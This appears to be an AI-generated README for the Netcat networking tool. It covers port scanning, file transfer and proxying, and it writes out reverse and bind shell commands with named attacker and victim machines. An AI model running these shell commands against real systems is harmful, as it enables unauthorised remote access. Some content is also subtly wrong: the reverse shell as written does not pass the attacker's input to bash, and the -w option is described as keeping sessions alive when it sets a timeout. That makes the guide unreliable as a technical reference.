Here is the revised version of the **Netcat README** in `.md` format for GitHub, including a comprehensive table of options and a valid cheat sheet link.

---

# Netcat (nc) - The Swiss Army Knife of Networking

## What is Netcat?

Netcat (`nc`) is a powerful networking tool used for various network-related tasks such as port scanning, banner grabbing, file transfers, debugging, and establishing reverse or bind shells. It supports both **TCP** and **UDP** protocols, making it a versatile utility for penetration testers, network administrators, and developers.

---

## Installation

Make sure Netcat is installed on your system. To check:

```bash
nc -h
```

If not installed, use the following commands to install it:

- **Debian/Ubuntu**:  
  ```bash
  sudo apt-get install netcat
  ```
- **CentOS/Fedora**:  
  ```bash
  sudo yum install nc
  ```
- **macOS**:  
  ```bash
  brew install netcat
  ```

---

## Basic Usage

### 1. **Connecting to a TCP Port**

```bash
nc <target-ip> <port>
```
Example:
```bash
nc 192.168.1.100 80
```

### 2. **Sending Data to a Port**

```bash
echo "Hello" | nc <target-ip> <port>
```
Example:
```bash
echo "Hello" | nc 192.168.1.100 8080
```

### 3. **Port Scanning**

```bash
nc -zv <target-ip> <start-port>-<end-port>
```
Example:
```bash
nc -zv 192.168.1.100 1-1000
```

---

## Intermediate Usage

### 4. **Listening on a Port (Simple Server)**

```bash
nc -l <port>
```
Example:
```bash
nc -l 12345
```

### 5. **File Transfer**

#### Sending a file:
```bash
nc <target-ip> <port> < file.txt
```
Example:
```bash
nc 192.168.1.100 12345 < file.txt
```

#### Receiving a file:
```bash
nc -l <port> > file.txt
```
Example:
```bash
nc -l 12345 > file.txt
```

---

## Advanced Usage

### 6. **Creating a Reverse Shell**

#### On the attacker's machine (listening for shell):
```bash
nc -lvp 4444
```

#### On the victim’s machine (initiating the reverse shell):
```bash
/bin/bash -i | nc <attacker-ip> 4444
```

### 7. **Creating a Bind Shell**

#### On the target machine (setting up the shell):
```bash
nc -lvp 4444 -e /bin/bash
```

#### On the attacker’s machine (connecting to the shell):
```bash
nc <target-ip> 4444
```

---

## Other Useful Commands

### 8. **UDP Mode**

```bash
nc -u <target-ip> <port>
```
Example:
```bash
nc -u 192.168.1.100 12345
```

### 9. **Netcat as a Web Server**

```bash
while true; do echo -e 'HTTP/1.1 200 OK\n\nHello, World' | nc -l -p 80; done
```

### 10. **Proxying Traffic**

```bash
mkfifo /tmp/fifo
nc -l 12345 < /tmp/fifo | nc <target-ip> <target-port> > /tmp/fifo
```

---

## Netcat Options Table

| **Option**   | **Description**                                                |
|--------------|----------------------------------------------------------------|
| `-l`         | Listen mode, used to set up a listener on a specified port.    |
| `-p <port>`  | Specify the port for the listener or connection.               |
| `-v`         | Enable verbose mode to display detailed information.           |
| `-z`         | Zero-I/O mode, used for port scanning without sending data.    |
| `-u`         | Use UDP protocol (default is TCP).                             |
| `-e <cmd>`   | Execute the given command after connection (useful for shells).|
| `-w <secs>`  | Set timeout for idle connections (useful for keeping sessions alive). |
| `-n`         | No DNS resolution (use raw IP addresses only).                 |
| `-c <cmd>`   | Execute a command locally after connection closes.             |

---

## Netcat Cheat Sheet

You can access a detailed **[Netcat Cheat Sheet](https://pentest.sans.org/security-resources/posters/netcat-cheat-sheet/240/download)** by SANS, which provides more advanced usage tips for both Linux and Windows.

---

## Conclusion

Netcat is a versatile and essential tool for network testing and penetration testing. Whether you are scanning ports, transferring files, or establishing a reverse shell, Netcat can handle the task with ease. Be sure to explore the full range of its capabilities responsibly.

